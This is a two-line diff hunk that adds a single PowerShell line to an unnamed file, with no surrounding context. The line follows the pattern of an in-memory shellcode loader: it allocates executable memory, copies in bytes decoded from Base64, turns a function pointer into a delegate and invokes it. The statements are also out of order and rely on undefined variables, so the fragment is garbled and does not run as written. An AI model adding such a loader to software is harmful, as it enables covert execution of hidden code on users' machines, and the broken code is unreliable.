@@ -1,0 +1,2 @@
+$fn = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($addr, $type); $m = VirtualAlloc 0 $n 0x3000 0x40; [System.Runtime.InteropServices.Marshal]::Copy($bytes,0,$m,$n); $bytes = [Convert]::FromBase64String($s); $fn.Invoke()
+
